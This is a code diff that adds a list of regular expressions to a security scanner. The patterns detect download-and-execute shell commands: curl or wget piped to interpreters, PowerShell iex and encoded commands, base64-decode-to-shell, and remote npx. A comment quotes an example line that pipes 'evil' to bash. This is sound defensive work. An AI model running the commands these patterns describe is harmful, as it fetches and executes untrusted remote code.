@@ -128,6 +128,45 @@ export const PRIVILEGE_ESCALATION_PATTERNS: RegExp[] = [
 ]
 
 /**
+ * SMI-5359 Wave 4.2c / SMI-6033 Wave 1: Remote-fetch-to-interpreter
+ * ("code_execution") patterns. Previously re-declared inline in
+ * security-scanner-edge.exec.ts instead of living here (this module's single
+ * source of truth for every other shared pattern array) — moved here so a
+ * future edit can't silently apply to only one of the two copies.
+ *
+ * Every pattern requires BOTH a fetch verb (curl/wget/irm/iwr/Invoke-WebRequest/
+ * Net.WebClient) AND an execution sink (| sh|python|node…, <(...), eval $(...),
+ * iex, -EncodedCommand). A bare package install (npm/pip/brew/cargo/apt) matches
+ * none. Bounded quantifiers exclude the pipe / newline — no catastrophic backtracking.
+ *
+ * SMI-5359 Wave 4.2c retune (read-only prod sim FP): the curl/wget patterns also
+ * require a CONCRETE remote target (http(s):// or a host.tld domain), so a
+ * code-review/security-review skill documenting the generic pattern in prose
+ * ("curl … | sh", placeholder, no target) no longer matches, while a real
+ * "curl https://evil/x | bash" still does.
+ */
+export const CODE_EXECUTION_PATTERNS: RegExp[] = [
+  // curl|wget <target> | [sudo] <interpreter>
+  /(?:curl|wget)\b[^\n|]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n|]{0,150}?\|\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
+  // process substitution: bash/sh/zsh/source/. <(curl|wget <target> ...)
+  /(?:^|[\s;&])(?:source|\.|ba?sh|zsh|exec)\s+<\(\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
+  // command substitution into eval or `sh -c` with a remote target
+  /(?:\beval\b|(?:ba|z)?sh\s+-c)\s+["']?[$`]\(?\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
+  // PowerShell download-and-execute
+  /\b(?:iex|invoke-expression)\b[^\n]{0,100}?(?:\birm\b|\biwr\b|invoke-webrequest|invoke-restmethod|downloadstring|net\.webclient)/i,
+  // PowerShell encoded command
+  /\bpowershell\b[^\n]{0,60}?\s-e(?:nc|ncodedcommand)?\b\s*[A-Za-z0-9+/=]{16,}/i,
+  // decode-then-exec: base64 -d ... | <interpreter>  (SMI-5359 retro NIT: da sink + interpreters)
+  /\bbase64\s+(?:-d|--decode|-D)\b[^\n|]{0,60}?\|\s*(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
+  // SMI-5424 FN-1: chained / redirect download-then-execute (curl URL -o /tmp/x && bash /tmp/x)
+  /(?:curl|wget)\b[^\n]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n]{0,150}?(?:&&|;)\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
+  // SMI-5424 FN-2: npx executing a REMOTE source (URL or github:), never a local package (npx tsc is clean)
+  /\bnpx\s+(?:--yes\s+|-y\s+)?(?:https?:\/\/\S+|github:\S+)/i,
+  // SMI-5424 FN-4: node/python/deno/bun inline-eval (-e/-c) with a dangerous payload
+  /\b(?:node|python[23]?|deno|bun)\s+(?:-e|-c|--eval|--exec)\s+['"][^'"]{0,200}?(?:require\(|child_process|fetch\(|\bexec\b|eval\(|base64|urllib|os\.system|subprocess)/i,
+]
+
+/**
  * Prompt injection patterns - AI-specific attacks
  */
 export const PROMPT_INJECTION_PATTERNS: RegExp[] = [
